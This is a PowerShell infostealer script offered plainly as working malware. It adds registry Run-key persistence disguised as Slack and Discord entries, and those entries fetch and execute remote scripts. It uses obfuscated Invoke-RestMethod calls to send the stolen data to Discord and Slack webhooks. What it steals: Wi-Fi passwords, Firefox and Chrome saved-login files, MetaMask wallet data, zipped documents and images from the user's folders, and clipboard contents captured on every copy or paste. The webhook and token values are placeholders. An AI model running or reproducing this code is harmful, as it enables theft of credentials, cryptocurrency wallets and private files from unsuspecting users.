Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore

$dwbt='https://discord.com/api/webhooks/AAA' + 'AAA' + 'AAA'
$swbt='https://hooks.slack.com/services/AAA' + 'AAA'
$sat = "xoxb-AAA" + "AAA"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v slack.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/WesleyWong420/OPSEC-Tradecraft/refs/heads/main/WiFi_Browser_Passwords_Metamask_FilesExfil_ClipboardData.ps1 | iex\`"" > $null
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ /f /v discord.electron.app /t REG_SZ /d "conhost --headless powershell.exe -Command \`"irm https://raw.githubusercontent.com/WesleyWong420/OPSEC-Tradecraft/refs/heads/main/O.MG%20Payloads/Wallpaper%20%26%20Screen%20Capture.ps1 | iex\`"" > $null

netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object { $q1t = $_.Matches.Value; if (netsh wlan show profile $q1t key=clear | Select-String 'Security key\s+:\sPresent') { $passw = netsh wlan show profile $q1t key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object { $_.Matches.Value -replace '^\s*Key Content\s*:\s*', '' }; $a6 = @{'username' = $env:username + " | " + [string]$q1t; 'content' = "PSK: "+[string]$passw}; i""r''m -ContentType 'Application/Json' -Uri $dwbt -Method Post -Body ($a6 | ConvertTo-Json); $swbtm = @{'text' = "`*User: $env:USERNAME`*`nSSID: $q1t`nPSK: $passw"} | ConvertTo-Json -Compress; irm -ContentType 'Application/Json' -Uri $swbt -Method Post -Body $swbtm}}  > $null


try { $zzzz = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles' } catch {}
if (Test-Path $zzzz) {
    try { $zzz = Get-ChildItem -Path $zzzz | Where-Object { $_.Name -like "*default*" } } catch {}
    foreach ($zz in $zzz) {
        $fts = @('key4.db', 'logins.json', 'signons.sqlite')
        $uu = $env:USERNAME
        foreach ($fn in $fts) {
            $ffp = Join-Path -Path $zz.FullName -ChildPath $fn
            if (!(Test-Path $ffp)) { continue }
            try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
            $bd = [System.Guid]::NewGuid().ToString()
            $lf = "`r`n"
            $pt1 = @{
                "username" = $uu
                "content"  = "`**Uploading $fn from Firefox Profile:`** $($zz.FullName)"
            } | ConvertTo-Json -Compress
            $q1t = (
                "--$bd",
                "Content-Disposition: form-data; name=`"payload_json`"",
                "Content-Type: application/json",
                "",
                $pt1,
                "--$bd",
                "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
                "Content-Type: application/octet-stream",
                "",
                $fb,
                "--$bd--"
            ) -join $lf
            $hh = @{
                "Content-Type" = "multipart/form-data; boundary=$bd"
            }

            &(Get-Command i????e-rest*) -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null

            $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
            $sh = @{
                "Authorization" = "Bearer $sat"
                "Content-Type"  = "application/x-www-form-urlencoded"
            }
            $luur = &(Get-Command i????e-rest*) -Uri $st1 -Method Get -Headers $sh
            if ($luur.upload_url) {
                $suh = @{
                    "Content-Type" = "application/octet-stream"
                }
                &(Get-Command i????e-rest*) -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
                $scu = "https://slack.com/api/files.completeUploadExternal"
                $scb = @{
                    "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
                    "channel_id" = "C08F8RJ84P5"
                    "initial_comment"  = "`*Uploading $fn from Firefox Profile:`* $($zz.FullName)"
                } | ConvertTo-Json -Compress
                $sh = @{
                    "Authorization" = "Bearer $sat"
                    "Content-Type"  = "application/json"
                }
                &(Get-Command i????e-rest*) -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
            }
        }
    }
}

 
try { $ffp = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'Google\Chrome\User Data\Local State' } catch {}
if (Test-Path $ffp) {
    $uu = $env:USERNAME
    try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
    $bd = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"
    $pt1 = @{
        "username" = $uu
        "content"  = "`**Found backup:`** $ffp"
    } | ConvertTo-Json -Compress
    $q1t = (
        "--$bd",
        "Content-Disposition: form-data; name=`"payload_json`"",
        "Content-Type: application/json",
        "",
        $pt1,
        "--$bd",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Text.Encoding]::UTF8.GetString($fb),
        "--$bd--"
    ) -join $lf
    $hh = @{
        "Content-Type" = "multipart/form-data; boundary=$bd"
    }
    i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null

    $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
    $sh = @{
        "Authorization" = "Bearer $sat"
        "Content-Type"  = "application/x-www-form-urlencoded"
    }
    $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
    if ($luur.upload_url) {
        $suh = @{
            "Content-Type" = "application/octet-stream"
        }
        i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
        $scu = "https://slack.com/api/files.completeUploadExternal"
        $scb = @{
            "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
            "channel_id" = "C08F8RJ84P5"
            "initial_comment"  = "`*Found backup:`* $ffp"
        } | ConvertTo-Json -Compress
        $sh = @{
            "Authorization" = "Bearer $sat"
            "Content-Type"  = "application/json"
        }
        i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
    }
}


try { $ffp = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'Google\Chrome\User Data\Default\Login Data' } catch {}
if (Test-Path $ffp) {
    $uu = $env:USERNAME
    try { Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force;Start-Sleep -Seconds 1.5;$fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
    $bd = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"
    $pt1 = @{
        "username" = $uu
        "content"  = "`**Found backup:`** $ffp"
    } | ConvertTo-Json -Compress
    $q1t = (
        "--$bd",
        "Content-Disposition: form-data; name=`"payload_json`"",
        "Content-Type: application/json",
        "",
        $pt1,
        "--$bd",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Text.Encoding]::UTF8.GetString($fb),
        "--$bd--"
    ) -join $lf
    $hh = @{
        "Content-Type" = "multipart/form-data; boundary=$bd"
    }
    &(Get-Command i************************************************************e-rest*) -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null

    $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
    $sh = @{
        "Authorization" = "Bearer $sat"
        "Content-Type"  = "application/x-www-form-urlencoded"
    }
    $luur = &(Get-Command i************************************************************e-rest*) -Uri $st1 -Method Get -Headers $sh
    if ($luur.upload_url) {
        $suh = @{
            "Content-Type" = "application/octet-stream"
        }
        &(Get-Command i************************************************************e-rest*) -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
        $scu = "https://slack.com/api/files.completeUploadExternal"
        $scb = @{
            "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
            "channel_id" = "C08F8RJ84P5"
            "initial_comment"  = "`*Found backup:`* $ffp"
        } | ConvertTo-Json -Compress
        $sh = @{
            "Authorization" = "Bearer $sat"
            "Content-Type"  = "application/json"
        }
        &(Get-Command i************************************************************e-rest*) -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
    }
}


try { $zzzz = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn' } catch {}
if (Test-Path $zzzz) {
    try { $zzz = Get-ChildItem -Path $zzzz | Where-Object { $_.Name -notlike "*LOCK*" } } catch {}
    try { Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force;Start-Sleep -Seconds 1.5; } catch {}
    foreach ($zz in $zzz) {
        $uu = $env:USERNAME
        $ffp = Join-Path -Path $zzzz -ChildPath $zz
        try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
        $bd = [System.Guid]::NewGuid().ToString()
        $lf = "`r`n"
        $pt1 = @{
            "username" = $uu
            "content"  = "`**Found backup:`** $ffp"
        } | ConvertTo-Json -Compress
        $q1t = (
            "--$bd",
            "Content-Disposition: form-data; name=`"payload_json`"",
            "Content-Type: application/json",
            "",
            $pt1,
            "--$bd",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::UTF8.GetString($fb),
            "--$bd--"
        ) -join $lf
        $hh = @{
            "Content-Type" = "multipart/form-data; boundary=$bd"
        }
        try { i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null } catch { continue }

        $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
        $sh = @{
            "Authorization" = "Bearer $sat"
            "Content-Type"  = "application/x-www-form-urlencoded"
        }
        $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
        if ($luur.upload_url) {
            $suh = @{
                "Content-Type" = "application/octet-stream"
            }
            i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
            $scu = "https://slack.com/api/files.completeUploadExternal"
            $scb = @{
                "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
                "channel_id" = "C08F8RJ84P5"
                "initial_comment"  = "`*Found backup:`* $ffp"
            } | ConvertTo-Json -Compress
            $sh = @{
                "Authorization" = "Bearer $sat"
                "Content-Type"  = "application/json"
            }
            i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
        }
    }
}


function t {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text,
        [parameter(Position=2,Mandatory=$False)]
        [string]$folder 
    )

    $bd = @{
      'username' = $env:username
      'content' = "`**Uploading $text Files to Slack. This might take a while...`**`nCrawling Directory: ``$folder``"
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        i""r''m -ContentType 'Application/Json' -Uri $dwbt -Method Post -Body ($bd | ConvertTo-Json)

        $swbtm = @{'text' = "`*User: $env:USERNAME`*`nUploading $text Files to Slack. This might take a while...`nCrawling Directory: " + "``$folder``"} | ConvertTo-Json -Compress
        i""r''m -ContentType 'Application/Json' -Uri $swbt -Method Post -Body $swbtm
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        try { $fb = [System.IO.File]::ReadAllBytes($file) } catch { continue }
        $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $file) + "&length=" + $fb.Length
        $sh = @{
            "Authorization" = "Bearer $sat"
            "Content-Type"  = "application/x-www-form-urlencoded"
        }
        $luur = &(Get-Command i????e-rest*) -Uri $st1 -Method Get -Headers $sh
        if ($luur.upload_url) {
            $suh = @{
                "Content-Type" = "application/octet-stream"
            }
            &(Get-Command i????e-rest*) -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
            $scu = "https://slack.com/api/files.completeUploadExternal"
            $scb = @{
                "files" = @(@{ "id" = $luur.file_id; "title" = "$text" + ".zip" })
                "channel_id" = "C08F8RJ84P5"
                "initial_comment"  = "Downloaded $text Files from: ``$folder``"
            } | ConvertTo-Json -Compress
            $sh = @{
                "Authorization" = "Bearer $sat"
                "Content-Type"  = "application/json"
            }
            &(Get-Command i????e-rest*) -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
        }
    }
}

$ffds = @("$env:HOMEPATH\Desktop", "$env:HOMEPATH\Documents", "$env:HOMEPATH\Downloads")

$ft = @{
    "*.docx" = "Word (DOCX)";
    "*.doc" = "Word (DOC)";
    "*.pptx" = "PowerPoint";
    "*.xlsx" = "Excel";
    "*.pdf" = "PDF";
    "*.jpeg" = "JPEG";
    "*.png" = "PNG";
    "*.jpg" = "JPG";
    "*.csv" = "CSV";
    "*.txt" = "Text";
}

foreach ($ffr in $ffds) {
    if (Test-Path $ffr) {
        $ff = Get-ChildItem -Path $ffr -Include "*.docx","*.doc","*.pptx","*.xlsx","*.pdf","*.jpeg","*.png","*.jpg","*.csv","*.txt" -Recurse
        foreach ($hm in $ft.Keys) {
            $fff = $ff | Where-Object { $_.Name -like $hm }
            if ($fff) {
                $zf = "$env:TEMP\$($ft[$hm]).zip"
                $fff | Compress-Archive -DestinationPath $zf -Update
                t -file $zf -text "$($ft[$hm])" -folder $ffr
            }
        }
    }
}

function z9s {
    [CmdletBinding()]
    param (    
    [Parameter (Position=0,Mandatory = $True)]
    [string]$con
    ) 

    $b1b = @{
      'username' = $env:username
      'content' = "`**Clipboard Data:`**`n" + "``$con``"
    }
    
    i""r''m -Uri $dwbt -Method Post -Body $b1b > $null
    
    $swbtm = @{
        "text" = "`*User: $env:USERNAME`* `n`*Clipboard Data:`*`n" + "``````$con``````"
    } | ConvertTo-Json -Compress
    i""r''m -ContentType 'Application/Json' -Uri $swbt -Method Post -Body $swbtm > $null
}

z9s (Get-Clipboard)

while (1){
    $l8 = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
    $r8 = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
    $c8 = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
    $x8 = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)
    $v8 = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::v)
       if (($l8 -or $r8) -and ($x8 -or $c8 -or $v8)) {z9s (Get-Clipboard)}
       elseif ($r8 -and $l8) {z9s "---------update failed----------";exit}
       else {continue}
} 

exit
